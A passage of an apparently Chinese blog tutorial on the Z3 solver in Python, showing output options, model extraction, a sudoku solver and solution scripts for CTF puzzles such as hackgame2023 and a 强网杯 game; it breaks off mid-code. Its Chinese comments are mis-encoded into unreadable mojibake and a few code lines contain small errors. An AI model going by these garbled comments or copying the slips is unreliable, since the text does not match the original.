id="3-è¾“å‡ºç›¸å…³"><a href="#3-è¾“å‡ºç›¸å…³" class="headerlink" title="3.è¾“å‡ºç›¸å…³"></a>3.è¾“å‡ºç›¸å…³</h2><h3 id="å¼å­"><a href="#å¼å­" class="headerlink" title="å¼å­"></a>å¼å­</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Int(<span class="hljs-string">&#x27;y&#x27;</span>)<br>z = Int(<span class="hljs-string">&#x27;z&#x27;</span>)<br><br>n = x + y + z == <span class="hljs-number">3</span><br><br><span class="hljs-comment"># è¾“å‡ºå­å¼æ•°ç›®</span><br><span class="hljs-built_in">print</span>(n.num_args())<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">2</span><br><br><span class="hljs-comment"># è¾“å‡ºè¡¨è¾¾å¼çš„å­å¼</span><br><span class="hljs-built_in">print</span>(n.children())<br><span class="hljs-meta">&gt;&gt;&gt; </span>[x + y + z, <span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># è¾“å‡ºå…·ä½“å­å¼</span><br><span class="hljs-built_in">print</span>(n.arg(<span class="hljs-number">0</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>x+y+Z<br><span class="hljs-built_in">print</span>(n.arg(<span class="hljs-number">1</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">3</span><br><br><span class="hljs-comment"># è¾“å‡ºå…·ä½“æ“ä½œ</span><br><span class="hljs-built_in">print</span>(n.decl())<br><span class="hljs-meta">&gt;&gt;&gt; </span>==<br><br></code></pre></td></tr></table></figure><h3 id="è¾“å‡ºå…·ä½“å€¼è®¾ç½®"><a href="#è¾“å‡ºå…·ä½“å€¼è®¾ç½®" class="headerlink" title="è¾“å‡ºå…·ä½“å€¼è®¾ç½®"></a>è¾“å‡ºå…·ä½“å€¼è®¾ç½®</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Real(<span class="hljs-string">&#x27;x&#x27;</span>)<br><span class="hljs-comment"># è¾“å‡ºåˆ†æ•°</span><br>solve(<span class="hljs-number">3</span>*x == <span class="hljs-number">1</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>[<span class="hljs-number">1</span>/<span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># è¾“å‡ºåè¿›åˆ¶æ•°</span><br>set_option(rational_to_decimal=<span class="hljs-literal">True</span>)<br>solve(<span class="hljs-number">3</span>*x == <span class="hljs-number">1</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>[x = <span class="hljs-number">0.3333333333</span>?]<br><br><span class="hljs-comment"># è®¾å®šå°æ•°ä½æ•°</span><br>set_option(precision=<span class="hljs-number">30</span>)<br>solve(<span class="hljs-number">3</span>*x == <span class="hljs-number">1</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>[x = <span class="hljs-number">0.333333333333333333333333333333</span>?]<br></code></pre></td></tr></table></figure><h3 id="è¾“å‡ºçº¦æŸ"><a href="#è¾“å‡ºçº¦æŸ" class="headerlink" title="è¾“å‡ºçº¦æŸ"></a>è¾“å‡ºçº¦æŸ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Real(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Real(<span class="hljs-string">&#x27;y&#x27;</span>)<br>s = Solver()<br>s.add(x &gt; <span class="hljs-number">1</span>, y &gt; <span class="hljs-number">1</span>, Or(x + y &gt; <span class="hljs-number">3</span>, x - y &lt; <span class="hljs-number">2</span>))<br><span class="hljs-comment"># è¾“å‡ºçº¦æŸæ¡ä»¶ å¯ä»¥ç”¨æ¥éªŒè¯çº¦æŸè®¾å®šçš„å¯¹ä¸å¯¹</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s.assertions():<br>    <span class="hljs-built_in">print</span>(c)<br><span class="hljs-meta">&gt;&gt;&gt; </span>x &gt; <span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>y &gt; <span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>Or(x + y &gt; <span class="hljs-number">3</span>, x - y &lt; <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><h3 id="å–è§£ã€è§£çš„è½¬åŒ–"><a href="#å–è§£ã€è§£çš„è½¬åŒ–" class="headerlink" title="å–è§£ã€è§£çš„è½¬åŒ–"></a>å–è§£ã€è§£çš„è½¬åŒ–</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">x, y, z = Reals(<span class="hljs-string">&#x27;x y z&#x27;</span>)<br>s = Solver()<br>s.add(x &gt; <span class="hljs-number">1</span>, y &gt; <span class="hljs-number">1</span>, x + y &gt; <span class="hljs-number">3</span>, z - x &lt; <span class="hljs-number">10</span>)<br><br>s.check()<br>m = s.model()<br><span class="hljs-comment"># å–ç‰¹å®šçš„å€¼</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x = %s&quot;</span> % m[x])<br><br><span class="hljs-comment"># å–å‡ºæ‰€æœ‰çš„å€¼</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> m.decls():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s = %s&quot;</span> % (d.name(), m[d]))<br>    <br><span class="hljs-comment"># å¯¹äºIntï¼ŒBitVecå‹å¯ä»¥è¿™æ ·å°†å€¼è½¬åŒ–ä¸ºpython int</span><br>x_int = x.as_long()<br><br><span class="hljs-comment"># å¯¹äºRealå‹å¯ä»¥è¿™æ ·å°†å€¼è½¬åŒ–ä¸ºpython float</span><br>x_float = x.as_decimal(<span class="hljs-number">10</span>) <span class="hljs-comment">#æ‹¬å·ä¸­æ˜¯ä¿ç•™å°æ•°ä½æ•°</span><br></code></pre></td></tr></table></figure><h2 id="4-åˆ—è¡¨"><a href="#4-åˆ—è¡¨" class="headerlink" title="4.åˆ—è¡¨"></a>4.åˆ—è¡¨</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªåŒ…å«äº”ä¸ªå˜é‡çš„åˆ—è¡¨</span><br>X = [ Int(<span class="hljs-string">&#x27;x%s&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>) ]<br>Y = [ Int(<span class="hljs-string">&#x27;y%s&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>) ]<br><span class="hljs-built_in">print</span> (X)<br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªåŒ…å«äº”ä¸ªè¿ç®—çš„åˆ—è¡¨</span><br>X_plus_Y = [ X[i] + Y[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>) ]<br><span class="hljs-built_in">print</span> (X_plus_Y)<br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªåŒ…å«äº”ä¸ªçº¦æŸçš„åˆ—è¡¨</span><br>X_gt_Y = [ X[i] &gt; Y[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>) ]<br><span class="hljs-built_in">print</span> (X_gt_Y)<br><br><span class="hljs-built_in">print</span> (And(X_gt_Y))<br><br><span class="hljs-comment"># åˆ›å»ºå¤šç»´çš„å˜é‡</span><br>X = [ [ Int(<span class="hljs-string">&quot;x_%s_%s&quot;</span> % (i+<span class="hljs-number">1</span>, j+<span class="hljs-number">1</span>)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) ] <br>      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) ]<br>pp(X)<br></code></pre></td></tr></table></figure><h2 id="5-ä¾‹å­"><a href="#5-ä¾‹å­" class="headerlink" title="5.ä¾‹å­"></a>5.ä¾‹å­</h2><h3 id="ï¼ˆ1ï¼‰æ•°ç‹¬"><a href="#ï¼ˆ1ï¼‰æ•°ç‹¬" class="headerlink" title="ï¼ˆ1ï¼‰æ•°ç‹¬"></a>ï¼ˆ1ï¼‰æ•°ç‹¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># åˆ›å»º9*9çš„åˆ—è¡¨å­˜å‚¨å˜é‡</span><br>x = [[Int(<span class="hljs-string">&quot;x_%s_%s&quot;</span> % (i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># å¯¹ä¸€ä¸ªå˜é‡é™å®šåœ¨å–å€¼èŒƒå›´</span><br>bounds = [And(<span class="hljs-number">1</span> &lt;= x[i][j], x[i][j] &lt;= <span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># æ¯ä¸€è¡Œä¸èƒ½æœ‰ç›¸åŒå…ƒç´ ï¼ŒDistinctå³ä¸ºæ·»åŠ çº¦æŸä¸¤ä¸¤ä¸åŒ</span><br>rows = [Distinct(x[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># æ¯ä¸€åˆ—ä¸èƒ½æœ‰ç›¸åŒå…ƒç´ </span><br>cols = [Distinct([x[i][j] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># æ¯ä¸€ä¸ªä¹å®«æ ¼ä¸èƒ½æœ‰ç›¸åŒå…ƒç´ </span><br>sq = [Distinct([x[<span class="hljs-number">3</span> * ii + i][<span class="hljs-number">3</span> * jj + j]<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)])<br>      <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]<br><br>base_rules = bounds + rows + cols + sq<br><br><span class="hljs-comment"># æ•°ç‹¬çŸ©é˜µï¼Œä¸º0çš„å³ä¸ºæ²¡æœ‰å¡«çš„</span><br>instance = ((<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><br><span class="hljs-comment"># åˆ©ç”¨Ifè¯­å¥å°†æ£‹ç›˜å…ƒç´ æ˜ å°„ä¸ºz3ç±»å‹</span><br>instance_c = [If(instance[i][j] == <span class="hljs-number">0</span>,<br>                 <span class="hljs-literal">True</span>,<br>                 x[i][j] == instance[i][j])<br>              <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br>s = Solver()<br><br>s.add(base_rules + instance_c)<br><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    m = s.model()<br>    r = [[m.evaluate(x[i][j]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br>         <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br>    print_matrix(r)<br><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failed to solve&quot;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="ï¼ˆ2ï¼‰hackgame2023-å°zçš„è°œé¢˜"><a href="#ï¼ˆ2ï¼‰hackgame2023-å°zçš„è°œé¢˜" class="headerlink" title="ï¼ˆ2ï¼‰hackgame2023 å°zçš„è°œé¢˜"></a>ï¼ˆ2ï¼‰hackgame2023 å°zçš„è°œé¢˜</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><br>bound = <span class="hljs-number">5</span><br>constraints = ((<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))<br>count = [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>num_constraints = <span class="hljs-built_in">sum</span>(count)<br>num_dims = <span class="hljs-built_in">len</span>(constraints[<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># åˆ›å»º16*3*3çš„åˆ—è¡¨å­˜å‚¨å˜é‡</span><br>arrange = [[[Int(<span class="hljs-string">&#x27;x_%s_%s_%s&#x27;</span> % (k + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br><br>solver = Solver()<br><br><span class="hljs-comment"># Stage 0</span><br><span class="hljs-comment"># æ·»åŠ çº¦æŸä¸€</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            <span class="hljs-keyword">if</span> k == <span class="hljs-number">2</span>:<br>                solver.add(arrange[i][j][k] == -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">else</span>:<br>                solver.add(<span class="hljs-number">0</span> &lt;= arrange[i][j][k])<br>                solver.add(arrange[i][j][k] &lt;= bound)<br><br><span class="hljs-comment"># Stage 2</span><br><span class="hljs-comment"># æ·»åŠ çº¦æŸäºŒï¼Œå› ä¸ºæ»¡è¶³å…¶ä¸€å³å¯ï¼Œæ‰€ä»¥æ˜¯Orçš„å…³ç³»</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> i == j:<br>            <span class="hljs-keyword">continue</span><br>        solver.add(<br>            Or([(Or(arrange[i][k][<span class="hljs-number">1</span>] &lt;= arrange[j][k][<span class="hljs-number">0</span>], arrange[j][k][<span class="hljs-number">1</span>] &lt;= arrange[i][k][<span class="hljs-number">0</span>])) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br><br><span class="hljs-comment"># Stage 3</span><br><span class="hljs-comment"># æ·»åŠ çº¦æŸä¸‰ï¼Œè¿™é‡Œçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œåªè¦æ¯ä¸€è¡Œèƒ½å¤Ÿæ»¡è¶³å…¶ä¸­ä¸€ä¸ª</span><br><span class="hljs-comment"># ((1, 1, 3), (1, 2, 2), (1, 2, 4), (1, 4, 4), (2, 2, 2), (2, 2, 3))</span><br><span class="hljs-comment"># å³å¯ï¼ŒåŒæ—¶ä¹Ÿæœ‰æ•°é‡çº¦æŸï¼Œåˆ©ç”¨count[t]å®ç°å¯¹è¿™æ­¤çº¦æŸ</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> count[t]:<br>            g = []<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>(itertools.permutations(constraints[t])):<br>                o = []<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>                    o.append(arrange[i][j][<span class="hljs-number">1</span>] - arrange[i][j][<span class="hljs-number">0</span>] == p[j])<br>                g.append(And(o))<br><br>            solver.add(Or(g))<br>            count[t] -= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br><br><br> <br><span class="hljs-comment"># è®¡ç®—åˆ†æ•°</span><br><span class="hljs-comment"># è¿™é‡Œè®¡ç®—åˆ†æ•°æ–¹å¼æ˜¯æ¯ä¸€è¡Œèƒ½äº§ç”Ÿå¤šå°‘ç§ç¬›å¡å°”ç§¯ï¼Œ16è¡Œå†åšç´¯è®¡</span><br><span class="hljs-comment"># å› æ­¤åªéœ€è¦æ¯ä¸€è¡Œçš„æ¯ä¸€ç§ç¬›å¡å°”ç§¯èƒ½å¤Ÿå¯¹åº”æ‰€æœ‰ç¬›å¡å°”ç§¯ä¸­çš„ä¸€ç§å³å¯</span><br><span class="hljs-comment"># è€—æ—¶æ“ä½œä¸»è¦å°±åœ¨è¿™ä¸€æ­¥</span><br>g = []<br><span class="hljs-keyword">for</span> x0, y0, z0 <span class="hljs-keyword">in</span> itertools.product(*([<span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(-<span class="hljs-number">1</span>, bound + <span class="hljs-number">1</span>))] * <span class="hljs-number">3</span>)):<br>    t = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">for</span> x1, y1, z1 <span class="hljs-keyword">in</span> itertools.product(*arrange[i]):<br>            o = [x0 == x1, y0 == y1, z0 == z1]<br>            t.append(And(o))<br>    g.append(Or(t))<br><br><br><span class="hljs-comment"># ç»Ÿè®¡æœ‰å¤šå°‘ç§ç¬›å¡å°”ç§¯</span><br>s = Sum([If(i, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> g])<br><br><span class="hljs-comment"># æ§åˆ¶åˆ†æ•°</span><br>solver.add(s &gt;= <span class="hljs-number">157</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == z3.sat:<br>    ans = solver.model()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>                arrange[i][j][k] = ans[arrange[i][j][k]].as_long()<br><br>    arrange.sort()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(arrange[i][j][k]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_constraints) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_dims) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]))<br><br><span class="hljs-built_in">print</span>(arrange)<br></code></pre></td></tr></table></figure><h3 id="3-FlipGame-è„šæœ¬"><a href="#3-FlipGame-è„šæœ¬" class="headerlink" title="(3) FlipGame è„šæœ¬"></a>(3) FlipGame è„šæœ¬</h3><p>é¢˜æºå¼ºç½‘æ¯ HappyChess</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 